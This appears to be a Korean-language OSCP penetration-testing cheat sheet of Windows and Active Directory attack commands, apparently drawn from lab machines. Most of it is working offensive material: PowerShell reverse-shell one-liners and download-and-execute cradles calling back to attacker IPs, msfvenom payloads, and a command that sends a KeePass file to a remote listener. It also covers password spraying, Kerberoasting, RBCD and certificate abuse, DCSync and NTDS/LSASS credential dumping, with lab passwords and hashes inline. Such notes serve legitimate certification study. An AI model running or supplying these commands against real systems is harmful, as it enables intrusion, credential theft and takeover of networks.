# OSCP Windows



## 진단 도구

### ILSpy
```
# 윈도우, 리눅스에서 .NET에 대해 디컴파일이 가능한 크로스 플랫폼
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
```
```
unzip Linux.x64.Release.zip
unzip ILSpy-linux-x64-Release.zip
cd artifacts/linux-x64
sudo ./ILSpy
```

### Apache Directory
```
https://directory.apache.org/studio/
```

### Sharp Hound
```
git clone https://github.com/BloodHoundAD/BloodHound
```

### Power View
```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

### Powermad
```
wget https://github.com/Kevin-Robertson/Powermad/Powermad.ps1
```

### Rubeus
```
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
```

### impacket
```
sudo git clone https://github.com/fortra/impacket.git
git clone https://github.com/Mdulce18/impacket-with-dacledit.git
```

### pwsafe
```
sudo apt install passwordsafe
```

### targetd kerberoast
```
git clone https://github.com/ShutdownRepo/targetedKerberoast.git

# 시간동기화 필수
sudo ntpdate 10.10.11.42
```

### bloodyAD
```
git clone https://github.com/CravateRouge/bloodyAD.git
```

### pywhisker
```
git clone https://github.com/ShutdownRepo/pywhisker.git
```

### PKINTtools
```
git clone https://github.com/dirkjanm/PKINITtools.git

# 시간 동기화 해주기
sudo ntpdate 10.10.11.41
```

### certipy
```
git clone https://github.com/ly4k/Certipy.git
```

### kerbrute
```
git clone https://github.com/ropnop/kerbrute.git
```

### dnstool.py
```
git clone https://github.com/dirkjanm/krbrelayx.git
```

### gMSADumper
```
git clone https://github.com/micahvandeusen/gMSADumper
```

### ps1파일
```
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
```

### groovy script
```
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
```

### vncpwd
```
https://github.com/jeroennijhof/vncpwd
gcc -o vncpwd vncpwd.c d3des.c
```




<br>

---

## 정보수집

### smbclient
```
smbclient -L \\\\10.10.11.174
smbclient \\\\10.10.11.174\\support-tools
smbclient -L \\\\pinocure.com\\
smbclient -L \\\\10.10.10.175 -N
```
```
smbclient.py Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248
```
```
get UserInfo.exe.zip
get "SQL Server Procedures.pdf"

mask ""
recurse ON
prompt OFF
mget *
```

### rpcclient
```
rpcclient -U "" -N 10.10.10.182
```

### ldapsearch
```
ldapsearch -x -H ldap://10.10.10.182 -b "DC=pinocure,DC=com" > pinocure-ldap
```
```
grep -i 'userPrincipalName:' pinocure-ldap| cut -d ' ' -f2 > pinocure-emails
```

### wine - ldap
```
wine UserInfo.exe -v find -first "administrator"
```

### wireshark

### base64
```
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

### enum4linux
```
enum4linux -a 10.10.11.108
```

### netcat
```
sudo nc -lvnp 389
```

### hashcat
```
hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt

# kerberos
hashcat -a 0 -m 13100 ethan /usr/share/wordlists/rockyou.txt

# as rep roasting
hashcat --help | grep Kerberos
hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force

hashcat -m 13400 CEH.kdbx.hash /usr/share/wordlists/rockyou.txt --user
```

### pwsafe
```
pwsafe Backup.psafe3
```

### netexec
```
netexec smb 10.10.11.42 -u user.txt -p pass.txt
netexec smb 10.10.10.182 -u r.thompson -p 'rY4n5eva'
```

### john
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
john support_hash --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
```

### 파일 다운로드
```
d=2020-01-01; while [ "$d" != "$(date -I)" ]; do echo "http://10.10.10.248/Documents/$d-upload.pdf"; d=$(date -I -d "$d + 1 day"); done | xargs -n 1 -P 20 wget -q 2>/dev/null
```

### exiftool
```
# 유저 정보 수집
exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userlist
```

### pdf를 text로 변환
```
for f in *pdf; do pdftotext $f; done
```
```
# 파일 내용 확인
head -n1 *txt
cat 2020-{06-04,12-30}-upload.txt
```

### searchsploit
```
searchsploit NVMS
```

### LFI - Directory Traversal

### mdb-tools
```
mdb-tables backup.mdb | grep --color=auto user
mdb-export backup.mdb auth_user
```

### 7zip
```
7z l -slt Access\ Control.zip
7z x Access\ Control.zip
```

### readpst
```
readpst -tea -m 'Access Control.pst'
```

### 바로가기 파일 열거
```
Get-ChildItem "C:\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt
```

### runas 검색
```
ForEach($file in gc .\shortcuts.txt) { Write-Output $file; gc $file | Select-String runas }
```

### icacls
```
icacls C:\Users\Public\Desktop
```

### 그룹 확인
```
whoami /groups
whoami /priv
```

### windapsearch
```
./windapsearch.py -d pinocure.com --dc-ip 10.10.10.175 -U
```

### impacket - GetADUsers.py
```
GetADUsers.py pinocure.com / -dc-ip 10.10.10.175 -debug
```

### ffuf
```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.175/
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://pinocure.com:80/FUZZ
```

### username-anarchy
```
./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt
```

### GetNPUsers.py
```
while read p; do GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.10.10.175 >> hash.txt; done < unames.txt
```
```
impacket-GetNPUsers -no-pass -usersfile userlist.txt -dc-ip 10.10.10.192 pinocure.com/
impacket-GetNPUsers -no-pass -usersfile userlist.txt -dc-ip 10.10.10.192 pinocure.com/ | grep -v 'KDC_ERR_C'
```

### hm.txt
```
more < hm.txt:root.txt
```

### smbmap
```
smbmap -H 10.10.10.182 -u "r.thompson" -p "rY4n5eva"
```

### dig
```
dig any pinocure.com @10.10.10.192
```



<br>

---

## 초기 침투

### ldap
```
ldapsearch -x -H ldap://pinocure.com -D "ldap@pinocure.com" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=pinocure,dc=com" "(objectClass=*)"
```

### evil-winrm
```
evil-winrm -u pinocure -p 'Ironside47pleasure40Watchful' -i pinocure.com
evil-winrm -i 10.10.11.42 -u Administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
evil-winrm -i 10.10.10.233 -u pinocure -p '1edFg43012!!'
```

### 파일 업로드
```
upload /usr/share/windows-resources/binaries/nc.exe
```
```
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.32:8000/PowerView.ps1')
$SecPassword = ConvertTo-SecureString 'ruang123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ('ADMINISTRATOR\michael', $SecPassword)
$UserPassword = ConvertTo-SecureString 'ruang123123' -AsPlainText -Force
Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred
```

### rev shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=1337 -f exe > shell.exe
```

### msfconsole - multi handler(1회)
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set lhost 10.10.14.32
set lport 1337
run
```

### FTP
```
ftp benjamin@10.10.11.42
```
```
ftp 10.10.10.184
anonymous
passive
```
```
ftp anonymous@10.10.10.98
```

### targetd kerberoast
```
python3 targetedKerberoast.py --dc-ip 10.10.11.42 -d pinocure.com -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -U ethan.txt
```

### bloodyAD
```
bloodyAD --host "10.10.11.41" -d "pinocure.com" -u "judith.mader" -p "judith09" set owner management judith.mader
```

### impacket - mssqlclient
```
impacket-mssqlclient PublicUser:GuestUserCantWrite1@pinocure.com
```

### responder
```
responder -I tun0 -v
EXEC MASTER.sys.xp_dirtree '\\10.10.14.35\test', 1, 1
```

### kerbrute
```
go build -o kerbrute
sudo ./kerbrute passwordspray userlist NewIntelligenceCorpUser9876 --dc 10.10.10.248 -d pinocure.com
```

### dnstool
```
./dnstool.py -u 'pinocure\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.14.35 -t A
```

### msfconsole - 1회만 이용 가능
```
msfconsole
use auxiliary/scanner/ssh/ssh_login
set rhosts 10.10.10.184
set user_file users.txt
set pass_file passwords.txt
run
```

### telnet
```
telnet 10.10.10.98
```

### netexec
```
netexec smb 10.10.10.63 -u Administrator -p passwords.txt
netexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00
```

### splite3
```
sqlite3 Audit.db
```
```
.tables
select * from DeletedUserAudit;
select * from Ldap;
select * from Misc;
```

### lsass
```
# memory_analysis 폴더
get lsass.zip

# 다운로드 안될 시
prompt OFF
mget lsass.zip

smbget smb://10.10.10.192/forensic/memory_analysis/lsass.zip -U audit2020
```

### pypykatz
```
pypykatz lsa minidump lsass.DMP

# 만약 설치 안되어 있다면
pip3 install pypykatz
```
```
pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{print $2}' | sort -u
pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{print $2}' | sort -u > nt_hashes
```
```
pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{print $2}' | sort -u
pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{print $2}' | sort -u > users
```




<br>

---


## 권한상승

### 그룹 확인
```
whoami /groups
```

### Get-ADDomain
```
Get-ADDomain
```

### Blood Hound
```
sudo neo4j start
./BloodHound --disable-gpu --disable-software-rasterizer --in-process-gpu --disable-gpu-compositing
```
```
sudo neo4j console
./BloodHound --disable-gpu --disable-software-rasterizer --in-process-gpu --disable-gpu-compositing
```
```
python3 /opt/BloodHound.py/bloodhound.py -d pinocure.com -u olivia -p 'ichliebedich' -ns 10.10.11.42 -k --collectionmethod All
```
```
/opt/BloodHound.py/bloodhound.py -d pinocure.com -dc 'dc01.pinocure.com' -u 'judith.mader' -p 'judith09' -c all -ns 10.10.11.41
```
```
bloodhound-python -d pinocure.com -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c All
bloodhound-python -c DCOnly -u low -p 'Password123!' -d pinocure.com -dc dc01.pinocure.com
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d pinocure.com -ns 10.10.10.175 -c All
```


### Sharp Hound
```
cd C:\Users\support\Documents
upload SharpHound.exe
./SharpHound.exe
download 20250616084901_BloodHound.zip
```

### Power View
```
upload PowerView.ps1
. ./PowerView.ps1
```

### Rubeus
```
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:pinocure.com
```
```
# keberous ticket(admin)
./Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.pinocure.com /domain:pinocure.com /ptt
```

### impacket
```
sudo ./ticketConverter.py ticket.kirbi ticket.ccache
```
```
KRB5CCNAME=ticket.ccache ./psexec.py pinocure.com/administrator@dc.pinocure.com -k -no-pass
```

### net
```
net user pinocure
net localgroup "Audit Share"
```
```
# 유저 비밀번호 변경
net user michael ruang123 /domain
```

### gMSADumper
```
python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248
```

### ntpdate
```
# 시간 동기화
sudo ntpdate -s 10.10.10.248
```

### getST.py
```
getST.py -spn WWW/dc.pinocure.com -impersonate Administrator pinocure.com/svc_int -hashes :fb1016316a5da8e6eee87870bd7dad90
```

### 환경변수
```
export KRB5CCNAME=Administrator.ccache
```
```
unset KRB5CCNAME
```

### wimexec.py
```
wmiexec.py -k -no-pass dc.pinocure.com
```

### ps1 파일
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.34',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### admin.ps1 파일
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.34",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### 관리자 쉘 연결
```
runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.34/admin.ps1')"
```

### php 서버 실행 & 파일 다운
```
php -S 0.0.0.0:80
```
```
START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.34/shell.ps1')
```

### cmdkey
```
cmdkey /list
```

### winpeas & 다운로드
```
python3 -m http.server 4444
Invoke-WebRequest -Uri http://10.10.14.26:4444/winPEASx64.exe -OutFile winpeas.exe
.\winpeas.exe
```

### psexec.py
```
psexec.py pinocure.com/administrator@10.10.10.175 -hashes 823452073d75b9d1cf70ebdf86c7f98e:823452073d75b9d1cf70ebdf86c7f98e
psexec.py jeeves/Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

### kdbx
```
# 파일 칼리로 다운
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.26',4445);$stream = $client.GetStream();$file = [System.IO.File]::ReadAllBytes('C:\Users\kohsuke\Documents\CEH.kdbx');$stream.Write($file,0,$file.Length);$stream.Close();$client.Close()"

# CEH.kdbx 분석
keepass2john CEH.kdbx > CEH.kdbx.hash
cat CEH.kdbx.hash
```

### kpcli
```
kpcli --kdb CEH.kdbx

find .
show -f 0
show -f 2  
```

### robocopy
```
# C:\Users에서
robocopy /b C:\Users\Administrator\Desktop\ C:\Users\svc_backup
```

### DiskShadow
```
# 백업권한으로 권한상승이 가능할 때
https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
```
```
vi ruang.dsh

set context persistent nowriters
add volume c: alias ruang
create
expose %raj% z:
```
```
# unix를 dos환경으로 변경하여 dsh 실행
unix2dos ruang.dsh

# 공격대상 윈도우에서
mkdir C:\temp
upload ruang.dsh

diskshadow /s ruang.dsh
```

### ntds
```
# C에서 Z에 있는 ntds 복사해서 가져옴
robocopy /b z:/windows/ntds . ntds.dit
```

### secredtsdump
```
# 크래킹하려면 registry도 필요함
reg save hklm\system system
download ntds.dit
download system

impacket-secretsdump -ntds ntds.dit -system system LOCAL
```



<br>

---

## Active Directory

### RBCD(Resource Based Constrained Delegation) 가능성 확인
```
Get-ADObject -Identity ((Get-ADDomain).DistinguishedName) -Properties ms-DS-MachineAccountQuota
```

### 컴퓨터 새로 만들기
```
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

### RBCD
```
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
```

### 바이트 데이터를 문자로 변환
```
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor
$Descriptor.DiscretionaryAcl
```

### ForceChangePassword
```
# ForceChangePassword가 있으면 비밀번호 변경하기
net user michael ruang123 /domain

# 윈도우 비밀번호 정책에 맞게 변경
setuserinfo2 audit2020 23 'Ruang123!@#'
```

### Generic All
```
python3 /opt/pywhisker/pywhisker/pywhisker.py -d "pinocure.com" -u "management_svc" -H 'a091c1832bcdd4677c28b5a6a1295584' --target "ca_operator" --action "add"
python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx dJS58bxs.pfx pinocure.com/ca_operator -pfx-pass 'fe3mCmk6yzKuLsqx6a5D' ca_operator.ccache
python3 /opt/PKINITtools/getnthash.py -key 9938ac314bbbe01d8856be69315a8af5c62a9f7057b431a0b0d249be5f426c89 pinocure.com/ca_operator
```

### nxc
```
nxc ldap pinocure.com -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 -M adcs
nxc ldap 10.10.10.192 -u 'support' -p $(cat support_passwd )
nxc ldap 10.10.10.192 -u support -p $(cat support_passwd) --bloodhound --dns-server 10.10.10.192 --collection All
```
```
# brute force
nxc smb 10.10.10.192 -u support -p $(cat support_passwd)
nxc smb 10.10.10.192 -u audit2020 -p $(cat audit2020_passwd)
nxc winrm 10.10.10.192 -u audit2020 -p $(cat audit2020_passwd)
nxc smb 10.10.10.192 -u users -H nt_hashes
nxc winrm 10.10.10.192 -u svc_backup -H svc_backup_hash
```

### certipy
```
python3 /opt/Certipy/certipy/entry.py find -u ca_operator@pinocure.com -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout

# ESC9
certipy-ad account update -username management_svc@pinocure.com -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator

# 관리자 pfx 생성
certipy-ad req -username ca_operator@pinocure.com -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication
certipy-ad account update -username management_svc@pinocure.com -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@pinocure.com

# 관리자 TGT 획득
certipy-ad auth -pfx administrator.pfx -domain pinocure.com -dc-ip 10.10.11.41
```

### DCSync
```
secretsdump.py -just-dc pinocure.com/ethan@10.10.11.42
secretsdump.py pinocure/svc_loanmgr@10.10.10.175 -just-dc-user Administrator
```

### impacket - dacledit.py
```
python3 /opt/dacleedit-with-impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target 'management' "pinocure.com"/"judith.mader":'judith09'

# management 그룹 추가
net rpc group addmem "management" "judith.mader" -U "pinocure.com"/"judith.mader"%'judith09' -S "dc01.pinocure.com"
```

### pywhisker - TGT 획득
```
python3 /opt/pywhisker/pywhisker/pywhisker.py -d "pinocure.com" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
```

### PKINTtools - TGT 획득
```
python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx CqsvXJDp.pfx pinocure.com/management_svc -pfx-pass 'KyM37JAbJekY5Rni6Amt' management_svc.ccache

export KRB5CCNAME=management_svc.ccache
python3 /opt/PKINITtools/getnthash.py -key ef5b92bda9dff6a60b909b74c9db14e9ad20e89de2e00e6e4c98cdc4966088ae pinocure.com/management_svc
```






















